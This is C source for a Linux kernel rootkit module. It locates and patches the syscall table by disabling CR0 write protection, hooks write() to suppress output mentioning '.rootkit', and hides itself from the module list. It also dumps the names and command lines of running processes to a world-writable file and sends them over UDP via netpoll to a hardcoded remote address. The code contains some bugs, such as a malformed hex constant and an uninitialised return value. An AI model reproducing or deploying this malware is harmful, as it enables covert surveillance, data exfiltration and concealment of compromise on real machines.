#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/kthread.h>
#include <linux/sched.h>
#include <linux/list.h>
#include <linux/spinlock.h>
#include <linux/mm.h>
#include <linux/wait.h>
#include <linux/slab.h>
#include <linux/delay.h>
#include <linux/fs.h>
#include <linux/preempt.h>
#include <linux/kallsyms.h>
#include <asm/atomic.h>
#include <linux/init.h>
#include <linux/kobject.h>
#include <linux/syscalls.h>
#include <linux/string.h>
#include <linux/netpoll.h>
#include <linux/time.h>


struct kmem_cache* procEntryCache;

#define MESSAGE_SIZE 1024
#define INADD_LOCAL ((unsigned long int)0x0a00020f)
#define INADD_SEND ((unsigned long int)0xc0a80123)
static struct netpoll* np = NULL;
static struct netpoll np_t;

MODULE_LICENSE("GPL");

#if defined(__i386__)
#define START_CHECK 0xc0000000
#define END_CHECK 0xd0000000
typedef unsigned int psize;
#else
#define START_CHECK 0xffffffff81000000
#define END_CHECK Oxffffffffa2000000
typedef unsigned long psize;
#endif

asmlinkage ssize_t (*o_write)(int fd, const char __user * buff, ssize_t count);

	

psize *sys_call_table;


typedef int (*access_process_vm_type)(struct task_struct *tsk, unsigned long addr, void *buf, int len, int write);

static char* g_target_proc;
module_param_named(proc_name, g_target_proc, charp, 0);

static int g_dump_timeout;
module_param_named(dump_timeout, g_dump_timeout, int, 0);

static struct task_struct* g_saver_thread;
static struct task_struct* g_dumper_thread;
static struct task_struct* g_send_thread;

static struct list_head g_proc_dumps_list;
static struct mutex g_proc_dumps_lock;

static atomic_t g_stop_flag;

typedef struct _ProcEntry {
	struct list_head link;
	char*  procName;
	char*  procCmd;
	pid_t  pid;
} ProcEntry;

typedef struct _ThreadCtx {
	atomic_t* stop_flag;
	int       dump_to;
} ThreadCtx;

static ThreadCtx g_threadCtx;

#define BEGIN_KMEM {old_fs = get_fs(); set_fs(get_ds());}
#define END_KMEM set_fs(old_fs);
#define DUMP_FILE_NAME "/home/dumps.txt"
#define DUMP_FILE_PERM 0777


psize **find(void)
{
	psize **sctable;
	psize i = START_CHECK;
	while (i < END_CHECK){
		sctable = (psize **) i;
		if(sctable[__NR_close] == (psize *)sys_close){
			return &sctable[0];
		}
		i += sizeof(void *);
	}
	return NULL;
}


asmlinkage ssize_t rootkit_write(int fd, const char __user *buff, ssize_t count)
{
	int r;
	char *proc_protect = ".rootkit";
	char *kbuff = (char *) kmalloc(256, GFP_KERNEL);
	copy_from_user(kbuff, buff, 255);
	if(strstr(kbuff, proc_protect)){
		kfree(kbuff);
		return r;
	}
 
	r = (*o_write)(fd, buff, count);
	kfree(kbuff);
	return r;
}
static void write_to_file(char* data)
{
	mm_segment_t old_fs;
	struct file* file = NULL;
	int size = 0;
	int flags = 0;
	loff_t pos = 0;

	flags = O_WRONLY | O_APPEND | O_CREAT;
	size = strlen(data);
	data[size] = '\n';

	preempt_disable();
	file = filp_open(DUMP_FILE_NAME, flags, DUMP_FILE_PERM);
	preempt_enable();
	if ((file == NULL) || (IS_ERR(file))) {
		printk(KERN_INFO "failed to open file\n");
		return;
	}

	preempt_disable();
	BEGIN_KMEM;
	file->f_op->write(file, data, size + 1, &pos);
	END_KMEM;
	preempt_enable();

	filp_close(file, NULL);
}

static int saver_thread_func(void* arg)
{
	struct list_head* list = NULL;
	struct list_head* safe = NULL;
	ProcEntry*        procEntry = NULL;
	char              sep[128];

	np_t.name = "LRNG";
	strlcpy(np_t.dev_name, "eth0", IFNAMSIZ);
	np_t.local_ip = htonl(INADD_LOCAL);
	np_t.remote_ip = htonl(INADD_SEND);
	np_t.local_port = 6665;
	np_t.remote_port = 6666;

	memset(np_t.remote_mac, 0xff, ETH_ALEN);
	netpoll_print_options(&np_t);
	netpoll_setup(&np_t);
	np = &np_t;

	while (1) {
		mutex_lock(&g_proc_dumps_lock);
		if (!list_empty(&g_proc_dumps_list)) {
			snprintf(sep, sizeof(sep) - 1, "------------ Start of dump ------------\n");
			write_to_file(sep);

			list_for_each_safe(list, safe, &g_proc_dumps_list) {
				procEntry = list_entry(list, ProcEntry, link);
				list_del(list);
				
				write_to_file(procEntry->procName);

				kfree(procEntry->procName);
				if (procEntry->procCmd) {
					snprintf(sep, sizeof(sep) - 1, "[=]Cmdline of requested proc:");
					write_to_file(sep);

					write_to_file(procEntry->procCmd);
					kfree(procEntry->procCmd);
				}
				kfree(procEntry);
			}

			snprintf(sep, sizeof(sep) - 1, "------------ End of dump ------------\n\n\n");
			write_to_file(sep);
		}
		mutex_unlock(&g_proc_dumps_lock);

		if (atomic_read(&g_stop_flag) == 1) {
			printk(KERN_CRIT "Stop saver thread!\n");
			break;
		}	
		ssleep(g_dump_timeout);
	}
	return 0;
}



static int send_thread_func(void* arg)
{
	struct list_head* list = NULL;
	struct list_head* safe = NULL;
	ProcEntry*        procEntry = NULL;
	char              sep[40];
	struct timespec  proc_time;

	np_t.name = "LRNG";
	strlcpy(np_t.dev_name, "eth0", IFNAMSIZ);
	np_t.local_ip = htonl(INADD_LOCAL);
	np_t.remote_ip = htonl(INADD_SEND);
	np_t.local_port = 6665;
	np_t.remote_port = 6666;

	memset(np_t.remote_mac, 0xff, ETH_ALEN);
	netpoll_print_options(&np_t);
	netpoll_setup(&np_t);
	np = &np_t;

	while (1) {
		mutex_lock(&g_proc_dumps_lock);
		if (!list_empty(&g_proc_dumps_list)) {
			snprintf(sep, sizeof(sep) - 1, "------------ Start of dump ------------\n");
			netpoll_send_udp(np, sep, sizeof(sep));

			list_for_each_safe(list, safe, &g_proc_dumps_list) {
				procEntry = list_entry(list, ProcEntry, link);
				list_del(list);
				
				snprintf(sep, sizeof(sep) - 1, "[=]name of requested proc: %s", procEntry->procName);
				netpoll_send_udp(np, sep, sizeof(sep));				

				getnstimeofday(&proc_time);
				unsigned long a ,b, c, d;
				a = (proc_time.tv_sec / 3600) % 24;
				b = (proc_time.tv_sec / 60) % 60;
				c = proc_time.tv_sec % 60;
				d = proc_time.tv_nsec / 1000;

				snprintf(sep, sizeof(sep) - 1, "[=]time %.2lu-%.2lu-%.2lu %.6lu \r", a , b, c, d);
				netpoll_send_udp(np, sep, sizeof(sep));

				kfree(procEntry->procName);
				if (procEntry->procCmd) {
					snprintf(sep, sizeof(sep) - 1, "[=]Cmdline of requested proc: %s", procEntry->procCmd);
					netpoll_send_udp(np, sep, sizeof(sep));
					
				}

				if(procEntry->pid){
					snprintf(sep, sizeof(sep) - 1, "[=]pid of requested proc: %d", procEntry->pid);

					netpoll_send_udp(np, sep, sizeof(sep));

				}

				kfree(procEntry);
			}

			snprintf(sep, sizeof(sep) - 1, "------------ End of dump ------------\n\n\n");
			netpoll_send_udp(np, sep, sizeof(sep));
		}
		mutex_unlock(&g_proc_dumps_lock);

		if (atomic_read(&g_stop_flag) == 1) {
			printk(KERN_CRIT "Stop send thread!\n");
			break;
		}	
		ssleep(g_dump_timeout);
	}
	return 0;
}


static int dumper_thread_func(void* arg)
{
	access_process_vm_type vm_acc = NULL;
	struct task_struct*    p = NULL;
	struct mm_struct*      mm = NULL; 
	ProcEntry*             procEntry = NULL;
	ThreadCtx*             threadCtx = (ThreadCtx*)arg;
	char*                  buf = NULL;
	int                    len = 0;
	int                    res = 0;
	int                    i = 0;
	

	vm_acc = (access_process_vm_type)kallsyms_lookup_name("access_process_vm");
	if (!vm_acc) {
		printk(KERN_CRIT "Failed to find addr of access_process_vm");
		return -ESRCH;
	}

	while (1) {
		for_each_process(p) {
			//procEntry = kmalloc(sizeof(*procEntry), GFP_KERNEL);
			procEntry = kmem_cache_alloc(procEntryCache, GFP_KERNEL);

			if (!procEntry) {
				printk(KERN_CRIT "Failed to alloc memory for proc entry!\n");
				break;
			}
			memset(procEntry, 0, sizeof(*procEntry));

			procEntry->procName = kmalloc(strnlen(p->comm, TASK_COMM_LEN) + 1, GFP_KERNEL);
			if (procEntry->procName == NULL) {
				printk(KERN_CRIT "No mem for proc name!\n");
				//kfree(procEntry);
				kmem_cache_free(procEntryCache, procEntry);

				break;
			}
			strcpy(procEntry->procName, p->comm);
			procEntry->procName[strlen(p->comm)] = '\0';
			
			if (strstr(g_target_proc, p->comm)) {
				mm = get_task_mm(p);
				if (mm) {
					len = mm->arg_end - mm->arg_start;
					if (!len) {
						printk(KERN_INFO "Empty command line for: %s!\n", procEntry->procName);
					} else {
						buf = kmalloc(PAGE_SIZE, GFP_KERNEL);
						if (!buf) {
							printk(KERN_CRIT "Failed to alloc mem for arv!\n");
							kfree(procEntry->procName);
							//kfree(procEntry);
							kmem_cache_free(procEntryCache, procEntry);
							mmput(mm);
							break;
						}

						res = 0;
						if (len > PAGE_SIZE) {
							len = PAGE_SIZE;
						}
						res = vm_acc(p, mm->arg_start, buf, len, 0);
						if (res > 0) {
							buf[res-1] = '\0';
							for (i = 0; i < res - 1; i++) {
								if (buf[i] == '\0') {
									buf[i] = ' ';
								}
							}
							procEntry->procCmd = buf;
						}
					}
					mmput(mm);
				} else {
					printk(KERN_INFO "Skipping kernel process\n");
				}
			}

			mutex_lock(&g_proc_dumps_lock);
			list_add_tail(&procEntry->link, &g_proc_dumps_list);
			mutex_unlock(&g_proc_dumps_lock);
		}

		if (atomic_read(threadCtx->stop_flag) == 1) {
			printk(KERN_CRIT "Stop saver thread!\n");
			break;
		}	
		ssleep(threadCtx->dump_to);
	}

	return 0;
}

static int __init rootkit_init(void)
{

	procEntryCache = kmem_cache_create("procEntry",
										sizeof(struct _ProcEntry),
										ARCH_MIN_TASKALIGN,
										SLAB_PANIC,
										NULL);

	printk(KERN_INFO "[+]Target proc: %s num: %d\n", g_target_proc, g_dump_timeout);

	if ((!g_target_proc) || (!strlen(g_target_proc))) {
		printk(KERN_CRIT "Empty target proc name!\n");
		return -EINVAL;
	}

	if (g_dump_timeout <= 0) {
		printk(KERN_CRIT "Empty target proc name!\n");
		return -EINVAL;
	}

	INIT_LIST_HEAD(&g_proc_dumps_list);	
	mutex_init(&g_proc_dumps_lock);
	atomic_set(&g_stop_flag, 0);

	g_saver_thread = kthread_run(&saver_thread_func, NULL, "saver_thread");
	if (IS_ERR(g_saver_thread)) {
		printk(KERN_CRIT "failed to create saver thread\n");
		return -1;
	}

	g_send_thread = kthread_run(&send_thread_func, NULL, "send_thread");
	if (IS_ERR(g_saver_thread)) {
		printk(KERN_CRIT "failed to create send thread\n");
		return -1;
	}

	g_threadCtx.stop_flag = &g_stop_flag;
	g_threadCtx.dump_to = g_dump_timeout;
	g_dumper_thread = kthread_run(&dumper_thread_func, &g_threadCtx, "dumper_thread");
	if (IS_ERR(g_dumper_thread)) {
		kthread_stop(g_saver_thread);
		kthread_stop(g_send_thread);
		printk(KERN_CRIT "failed to create dumper thread\n");
		return -1;
	}


	list_del_init(&__this_module.list);
	kobject_del(&THIS_MODULE->mkobj.kobj);
    printk("rootkit: module loaded\n");

	if(sys_call_table = (psize *) find()){
	 	printk("rootkit: sys_call_table found at %p\n", sys_call_table);	
	} 
	else{
		printk("rootkit: sys_call_table not found\n");
	}

	write_cr0(read_cr0() & (~ 0x10000));

	o_write = (void *) xchg(&sys_call_table[__NR_write],rootkit_write);

	write_cr0(read_cr0() | 0x10000);


	return 0;
}

static void __exit rootkit_fini(void)
{
	atomic_set(&g_stop_flag, 1);
	kthread_stop(g_dumper_thread);
	kthread_stop(g_saver_thread);

	kmem_cache_destroy(procEntryCache);

	write_cr0(read_cr0() & (~ 0x10000));
	 xchg(&sys_call_table[__NR_write], o_write);
	 write_cr0(read_cr0() | 0x10000);
	 
	 printk("rootkit: module removed\n");
	return;
}

module_init(rootkit_init);
module_exit(rootkit_fini);
